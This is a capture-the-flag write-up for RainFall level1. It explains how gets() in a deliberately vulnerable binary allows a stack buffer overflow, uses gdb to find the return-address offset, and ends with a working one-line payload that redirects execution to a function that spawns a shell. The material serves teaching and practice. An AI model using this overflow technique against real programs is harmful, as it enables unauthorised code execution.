<h3>source.c</h3>

```console
void run(void) {
  fwrite("Good... Wait what?\n", 1, 19, stdout);
  system("/bin/sh");
}

void main(void) {
  char str[64];

  gets(str);
}
```

<h3>Analysis</h3>

This program is using the function `gets` with is unsafe and vulnerable to `buffer overflow` exploit

We can see that there is a function `run()` which will spawn a shell, but main function never call this function

We needs to find a way to run the call function `run()`

<h3>Exploit</h3>

We will use the vulnerability of `gets` function to overwrite the RET address, so when the function finish, it will jump to the address that we want to

Base on the assembly code, the stack should like something like this

```console
+------------+        -> esp
|  16 bytes  |        -> buffer for esp (0x50 or 80 bytes) each line represent 16 bytes
|  16 bytes  |        -> esp+0x10 start of the str pointer
|  16 bytes  |        
|  16 bytes  |
|  16 bytes  |        -> end of the str pointer (total 64 bytes)
+------------+
|   4 bytes  |        -> ebp
+------------+
|   4 bytes  |        -> RET (EIP)
+------------+
```

Theoretically by writing 64 bytes + 4 bytes (ebp) + 4 bytes (RET) should overwrite the return address

But the position of RET (EIP) might not be directly under the `ebp`, as compiler padding (alignment) can increase the size of the stack

We can see that there is an aligment at the start of the main function

```console
0x08048483 <+3>:  and    esp,0xfffffff0       -> bit alignment
```

Lets use gdb to check on how much bytes we needs to write before we can overwrite the `RET`

```console
(gdb) disas main

```

As we can see from the stack frame above, 64 * a is not enough to overwrite the return pointer

We need to add the total byte of ebp + the extra padding in order to reach the RET

So we need to write a total of `64 + 12 = 76 char` as an offset before we could overwrite the RET

Now lets find the address of the `run()`

```console
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Great! We have the address of the `run()`, now we just need to pack everything together and give it to the program

The address need to be written in reverse because of little endian

The `cat -` is needed as we want the spawned shell to stay open and this is the work around

```console
level1@RainFall:~$ (python -c "print 'a' * 76 + '\x44\x84\x04\x08'"; cat - ) | ./level1
Good... Wait what?
